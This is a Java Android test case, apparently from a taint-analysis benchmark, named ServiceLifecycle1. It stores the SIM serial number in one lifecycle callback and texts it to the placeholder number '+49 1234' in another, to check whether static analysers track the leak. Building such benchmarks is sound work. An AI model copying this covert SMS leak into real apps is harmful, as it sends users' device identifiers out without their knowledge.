package de.ecspride;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.IBinder;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;

/**
 * @testcase_name ServiceLifecycle1
 * @version 0.1
 * @author Secure Software Engineering Group (SSE), European Center for Security
 and Privacy by Design (EC SPRIDE) 
 * @author_mail siegfried.rasthofer@cased.de
 * 
 * @description A source is called and stored to a variable in one callback
 method,
 *  the variable is passed to a sink in another callback method
 * @dataflow onStartCommand: source -> secret; onLowMemory: secret -> sink
 * @number_of_leaks 1
 * @challenges the analysis must be able to handle the service lifecycle
 correctly 
 */
public class MainService extends Service {
    private String secret = null;
    
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        TelephonyManager telephonyManager =
          (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
        secret = telephonyManager.getSimSerialNumber();
        return 0;
    }
    
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
    
    @Override
    public void onLowMemory() {
        SmsManager sms = SmsManager.getDefault();
        sms.sendTextMessage("+49 1234", null, secret, null, null);
    }
    
    public MainService() { super(); }
    
    public static final String jlc$CompilerVersion$jl7 = "2.7.1";
    public static final long jlc$SourceLastModified$jl7 = 1450032968000L;
    public static final String jlc$ClassType$jl7 =
      ("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" +
       "kfwH8wOVxmQUAAA=");
}
